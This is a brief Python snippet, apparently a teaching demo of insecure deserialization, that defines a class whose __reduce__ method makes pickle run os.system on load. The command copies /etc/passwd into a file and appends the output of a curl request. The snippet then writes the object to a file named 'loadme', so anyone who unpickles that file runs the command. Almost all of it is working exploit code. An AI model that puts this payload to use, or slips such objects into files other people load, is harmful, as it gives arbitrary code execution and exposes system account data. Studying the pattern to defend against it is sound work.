### Pickling

```python
import os
import pickle
```

```python
class Exploit():
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt',))
```

```python
def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)
```

```python
serialize_exploit('loadme')
```
